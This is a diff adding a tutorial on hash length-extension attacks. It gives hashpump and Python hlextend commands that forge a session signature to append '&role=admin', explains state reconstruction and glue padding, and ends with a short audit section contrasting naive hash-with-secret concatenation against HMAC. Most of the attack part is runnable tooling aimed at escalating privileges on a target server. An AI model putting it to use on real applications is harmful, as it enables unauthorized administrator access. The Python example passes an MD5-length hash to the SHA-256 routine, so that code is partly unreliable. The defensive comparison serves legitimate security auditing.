@@ -1,1 +1,79 @@
 
+🚀 Method 1: Automated Attack with hashpump (Fastest)
+
+hashpump is a dedicated command-line utility built explicitly to calculate length-extension inputs and forged hashes instantly.
+
+Step 1: Install hashpump
+
+On Linux (including Kali) or macOS (via Homebrew), you can pull it directly down to your system:
+bash
+sudo apt install hashpump      # Ubuntu/Debian/Kali
+brew install hashpump          # macOS
+Use code with caution.
+
+Step 2: Run the attack payload generator
+
+Assume a web application uses a vulnerable signature 6463... for a user session profile string user=john&role=user. You guess the underlying secret key length is roughly 16 bytes, and you want to append &role=admin.
+Run the tool by feeding it the known parameters using command flags:
+bash
+hashpump -s "6463bbca06cd94da3e9e1b2f4f2a7a40" -d "user=john&role=user" -a "&role=admin" -k 16
+Use code with caution.
+
+Step 3: Parse the terminal output
+
+hashpump will return two critical lines:
+1. The New Hash (Forforged Signature): c1897d2e9c... (Use this as your new auth token/cookie).
+2. The New Data Payload: A string containing your original data, hex escape characters representing the necessary algorithm internal block padding (\x80\x00...), and your malicious extension string.
+You simply URL-encode or hex-encode that data output string and submit it back to the target application server.
+
+🐍 Method 2: Scripting with Python (hlextend)
+
+If you are working inside a Python scripts pipeline or an environment where you cannot install binary tools like hashpump, use the native python hlextend library.
+
+Step 1: Install the module
+
+bash
+pip install hlextend
+Use code with caution.
+
+Step 2: Execute the extension script
+
+python
+import hlextend
+
+# Initialize the attack engine matching the target hash type
+# Supports: 'md5', 'sha1', 'sha256', 'sha512'
+sha256_attack = hlextend.new('sha256')
+
+# Run the parameter forging engine
+new_hash, new_data = sha256_attack.extend(
+    data=b"user=john&role=user",
+    append=b"&role=admin",
+    key_len=16,
+    hash="6463bbca06cd94da3e9e1b2f4f2a7a40"
+)
+
+print(f"Malicious forged hash: {new_hash}")
+print(f"Malicious raw payload string: {new_data}")
+Use code with caution.
+
+🧮 Understanding the Internal State Reconstruct
+
+When you feed variables into these tools, they perform three manual mathematical adjustments behind the scenes to bypass the signature check:
+1. Slicing the Hash: The original 32-byte or 64-byte hex hash string is broken down into separate internal 32-bit registers (e.g., A, B, C, D states for MD5).
+2. Injecting the States: The hash function registers are manually over-written with these custom states, tricking the algorithm into thinking it is halfway through a file hashing process instead of starting a new one.
+3. Glue Padding Re-calculation: It automatically looks at your key_len estimation to calculate exactly how many bits of padding (0x80 followed by null bytes and the bit-length marker) the original server added to align the block to a 64-byte or 128-byte boundary.
+
+🛡️ Checking for Vulnerable Hash Structures
+
+If you are auditing an app architecture, you can check if it is structurally vulnerable to length-extension attacks by verifying its hashing pattern via the terminal:
+• Vulnerable Formulation: Using standard concatenation patterns like:bash
+# Vulnerable to length extension
+echo -n "SECRET_KEY_HEREuser=guest" | md5sum
+Use code with caution.
+• Secure Formulation (HMAC): If the target utilizes proper Hashed Message Authentication Codes (HMAC-SHA256), it nests the hash calls safely (Hash(Key XOR opad + Hash(Key XOR ipad + Msg))), neutralizing length extension completely.bash
+# Secure against length extension
+echo -n "user=guest" | openssl dgst -sha256 -hmac "SECRET_KEY_HERE"
+Use code with caution.
+• Secure Modern Algorithms: Any systems migrating to SHA-3, BLAKE2, or SHA-512/256 are intrinsically immune because they do not use standard unmodified Merkle-Damgård structural states.
+
